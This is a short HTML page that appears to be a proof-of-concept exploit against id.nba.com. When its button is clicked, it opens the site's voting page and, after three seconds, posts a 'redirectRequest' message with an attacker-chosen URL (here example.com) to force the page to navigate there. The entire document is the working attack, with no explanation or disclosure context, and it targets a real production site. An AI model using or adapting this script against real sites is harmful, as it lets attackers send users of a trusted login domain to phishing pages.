<!doctype html>
<html>
<body>
<button id="go">Open NBA ID and redirect</button>

<script>
document.querySelector("#go").onclick = () => {
  const w = window.open(
    "https://id.nba.com/voting",
    "nba_test_window"
  );

  setTimeout(() => {
    w.postMessage(
      {
        identifier: "redirectRequest",
        url: "https://example.com/"
      },
      "https://id.nba.com"
    );
  }, 3000);
};
</script>
</body>
</html>
